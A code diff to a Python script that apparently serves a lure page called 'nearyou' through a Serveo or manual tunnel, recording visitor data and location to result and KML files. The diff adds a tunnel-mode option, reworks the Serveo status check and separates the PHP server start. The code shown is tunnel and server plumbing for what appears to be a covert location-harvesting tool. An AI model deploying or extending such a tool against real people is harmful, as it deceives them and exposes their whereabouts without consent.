@@ -18,15 +18,17 @@ W = '\033[0m'  # white
 parser = argparse.ArgumentParser()
 parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
 parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
+parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [default, manual]', required=True)
 args = parser.parse_args()
 subdom = args.subdomain
 kml_fname = args.kml
+tunnel_mode = args.tunnel
 
 result = 'template/nearyou/php/result.txt'
 info = 'template/nearyou/php/info.txt'
 site = 'nearyou'
 row = []
-version = '1.1.7'
+version = '1.1.8'
 
 def banner():
 	os.system('clear')
@@ -57,38 +59,35 @@ def ver_check():
 	else:
 		print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
 
+def tunnel_select():
+	if tunnel_mode == 'default':
+		serveo()
+	elif tunnel_mode == 'manual':
+		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W)
+		print(G + '[+]' + C + ' Append ' + W + '/nearyou/' + C + ' to tunnel URL...' + W)
+	else:
+		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
+		exit()
+
 def serveo():
 	global site, subdom
 	flag = False
 
 	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
 
-	with open('logs/ping.txt', 'w') as pinglog:
-		ping = subp.Popen(['ping', '-c', '2', 'serveo.net'], stdout=pinglog, stderr=pinglog)
-	time.sleep(2)
-	with open('logs/ping.txt', 'r') as pingread:
-		ping_status = pingread.read()
-		if 'Unreachable' in ping_status:
-			print(C + '[' + R + ' DOWN ' + C +']' + '\n')
-			exit()
-		else:
-			print(C + '[' + G + ' UP ' + C +']' + '\n')
-			
-	print(G + '[+]' + C + ' Starting PHP Server......' + W, end='')
-	with open('logs/php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
-		time.sleep(3)
 	try:
-		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
-		php_sc = php_rqst.status_code
-		if php_sc == 200:
-			print(C + '[' + G + ' Success ' + C + ']' + W + '\n')
+		time.sleep(1)
+		rqst = requests.get('https://serveo.net', timeout=5)
+		sc = rqst.status_code
+		if sc == 200:
+			print(C + '[' + G + ' UP ' + C + ']' + W + '\n')
 		else:
-			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W + '\n')
+			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
+			exit()
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Failed ' + C + ']' + W + '\n')
-		Quit()
-
+		print(C + '[' + R + ' DOWN ' + C + ']' + W + '\n')
+		exit()
+			
 	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
 	if subdom is None:
 		with open('logs/serveo.txt', 'w') as tmpfile:
@@ -117,6 +116,22 @@ def serveo():
 			except Exception as e:
 				print(e)
 				pass
+
+def server():
+	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
+	with open('logs/php.log', 'w') as phplog:
+		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
+		time.sleep(3)
+	try:
+		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
+		php_sc = php_rqst.status_code
+		if php_sc == 200:
+			print(C + '[' + G + ' Success ' + C + ']' + W)
+		else:
+			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
+	except requests.ConnectionError:
+		print(C + '[' + R + ' Failed ' + C + ']' + W)
+		Quit()
 
 def wait():
 	printed = False
@@ -293,7 +308,8 @@ def Quit():
 try:
 	banner()
 	ver_check()
-	serveo()
+	tunnel_select()
+	server()
 	wait()
 	main()
 
